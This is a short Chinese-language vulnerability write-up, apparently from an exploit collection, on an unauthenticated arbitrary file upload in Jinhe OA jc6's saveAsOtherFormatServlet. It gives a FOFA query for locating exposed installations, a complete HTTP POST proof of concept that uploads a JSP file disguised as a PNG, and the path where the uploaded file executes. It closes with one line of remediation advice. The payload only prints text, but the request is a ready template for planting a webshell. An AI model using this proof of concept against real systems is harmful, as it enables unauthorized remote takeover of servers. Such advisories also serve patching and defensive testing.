---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA saveAsOtherFormatServlet 任意文件上传漏洞

# 漏洞描述

金和OA（jc6 平台）的 `servlet/saveAsOtherFormatServlet` 接口未做有效的身份校验与文件类型校验，存在任意文件上传漏洞。未授权的远程攻击者可上传 JSP webshell 到 `/jc6/upload/gwzw/` 目录，直接获取服务器权限。

影响范围

金和OA jc6

# 漏洞复现

FOFA：app="金和网络-金和OA"

POC：

```
POST /jc6/servlet/saveAsOtherFormatServlet?fileName=shell HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="FileBlod"; filename="shell.jsp"
Content-Type: image/png

<% out.println("hello"); %>
------boundary--
```

上传成功后访问 `http://target/jc6/upload/gwzw/shell.jsp` 即可执行。

# 修复方案

对上传接口增加身份认证与文件类型白名单校验；联系厂商获取官方补丁并升级。
